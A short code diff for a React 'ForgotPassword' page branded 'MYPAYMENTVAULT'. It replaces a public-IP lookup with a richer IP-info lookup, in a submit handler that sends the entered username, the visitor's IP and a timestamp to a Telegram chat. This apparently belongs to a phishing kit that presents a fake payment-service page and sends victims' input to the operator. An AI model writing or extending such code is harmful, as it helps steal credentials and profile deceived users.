@@ -2,7 +2,7 @@ import { useState } from "react";
 import { useLocation } from "wouter";
 import { AuthHeader } from "@/components/auth-header";
 import { Eye, EyeOff } from "lucide-react";
-import { sendTelegram, getPublicIP } from "@/lib/telegram";
+import { sendTelegram, getIPInfo } from "@/lib/telegram";
 import { useI18n } from "@/lib/i18n";
 
 export default function ForgotPassword() {
@@ -19,7 +19,7 @@ export default function ForgotPassword() {
     e.preventDefault();
     setLoading(true);
     const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-    const ip = await getPublicIP();
+    const ip = await getIPInfo();
     await sendTelegram(
       `🔑 <b>MYPAYMENTVAULT - Forgot Password</b>\n\n` +
       `👤 Username: <code>${username}</code>\n` +
